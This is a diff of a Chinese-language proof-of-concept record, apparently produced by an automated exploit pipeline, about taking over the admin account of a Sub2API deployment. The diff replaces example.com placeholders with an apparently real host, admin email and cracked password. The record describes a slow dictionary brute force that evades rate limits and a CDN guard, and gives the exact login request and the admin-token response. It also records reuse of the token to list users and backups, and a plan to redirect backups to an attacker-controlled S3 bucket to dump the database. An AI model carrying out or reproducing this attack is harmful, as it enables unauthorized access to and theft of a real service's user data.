@@ -9,11 +9,11 @@
 - **language**: markdown
 - **source**: self
 - **verified**: 1
-- **verified_note**: task#607 / 主机 i6403，2026-10-31 00:53-00:56 +08：Chrome UA、不带 XFF、3.5s/请求慢跑 87 条字典，第 25 条命中。POST https://target483.example.com/api/v1/auth/login {"email":"user@example.com","password":"chaofan888"} → HTTP 200 {"code":0,"message":"success","data":{"access_token":"eyJhbGciOiJIUzI1NiIs...","refresh_token":"rt_...","user":{"id":1,"role":"admin"}}}；JWT claims 明示 user_id=1、role=admin，响应无 requires_2fa。同 UA 复用 token：GET /api/v1/admin/users?page=1&page_size=3 → 200，total=106（字段 id/email/role/balance/concurrency/status/notes/last_used_at）；GET /api/v1/admin/backups → 200；GET /api/v1/admin/backups/s3-config → 200（全空，需自建 S3 才能触发 dump）。原始响应存于 hit_admin_cc_v6x8_com.json 与 tok.txt。
+- **verified_note**: task#607 / 主机 i6403，2026-10-31 00:53-00:56 +08：Chrome UA、不带 XFF、3.5s/请求慢跑 87 条字典，第 25 条命中。POST https://cc.v6x8.com/api/v1/auth/login {"email":"admin@cc.v6x8.com","password":"chaofan888"} → HTTP 200 {"code":0,"message":"success","data":{"access_token":"eyJhbGciOiJIUzI1NiIs...","refresh_token":"rt_...","user":{"id":1,"role":"admin"}}}；JWT claims 明示 user_id=1、role=admin，响应无 requires_2fa。同 UA 复用 token：GET /api/v1/admin/users?page=1&page_size=3 → 200，total=106（字段 id/email/role/balance/concurrency/status/notes/last_used_at）；GET /api/v1/admin/backups → 200；GET /api/v1/admin/backups/s3-config → 200（全空，需自建 S3 才能触发 dump）。原始响应存于 hit_admin_cc_v6x8_com.json 与 tok.txt。
 - **path**: pocs/sub2api-admin-login-weak-password-domain-derived-jwt-takeove/sub2api_admin_weak_password.md
 - **tags**: sub2api,weak-password,admin,jwt,login,rate-limit,cdn-guard,no-2fa
 - **created_at**: 2026-10-30T17:05:54.806Z
-- **engine**: https://target483.example.com
+- **engine**: https://cc.v6x8.com
 - **found_by**: exploit
 
 ## 描述
@@ -48,7 +48,7 @@ Sub2API 管理端登录接口无验证码、无图形码、默认未启 TOTP，�
 ## 关键环境约束（踩过的坑）
 | 约束 | 原因 | 处理 |
 |---|---|---|
-| 必须带浏览器 UA | 前置 CDN 有 `_guard` 校验 | 固定 `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/192.0.2.4 Safari/537.36` |
+| 必须带浏览器 UA | 前置 CDN 有 `_guard` 校验 | 固定 `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/131.0.0.0 Safari/537.36` |
 | **不要**带 `X-Forwarded-For` | 带了会被 CDN 判异常 | 全流程不自定义 XFF 头 |
 | 限速按真实出口 IP 计 ≈20 次/分 | 登录接口限流 | 单线程 ≤3.5s/请求慢跑，别并发 |
 
@@ -56,7 +56,7 @@ Sub2API 管理端登录接口无验证码、无图形码、默认未启 TOTP，�
 ```http
 POST /api/v1/auth/login HTTP/1.1
 Host: <target>
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/192.0.2.4 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
 Content-Type: application/json
 
 {"email":"admin@<domain>","password":"<brand>888"}
@@ -82,7 +82,7 @@ User-Agent: <同上 Chrome UA>
 GET /api/v1/admin/backups          # 备份列表
 GET /api/v1/admin/backups/s3-config # 备份存储配置（endpoint/region/bucket/access_key_id/prefix）
 ```
-路由由源码 `routes/target482.example.com:644` 确认。若 s3-config 全空 → 无现成备份可下，
+路由由源码 `routes/admin.go:644` 确认。若 s3-config 全空 → 无现成备份可下，
 需把自有 S3 桶填进去再触发 dump，才能把业务库导出成文件。
 
 ## 判据
